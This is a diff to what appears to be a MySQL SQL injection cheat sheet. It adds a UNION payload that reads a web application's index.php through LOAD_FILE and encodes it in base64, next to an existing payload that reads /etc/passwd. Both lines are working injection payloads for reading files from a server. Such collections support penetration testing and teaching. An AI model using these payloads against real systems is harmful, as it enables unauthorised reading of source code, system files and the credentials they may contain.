@@ -389,6 +389,10 @@ Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The
 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 ```
 
+```sql
+UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
+```
+
 If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query
 
 ```sql
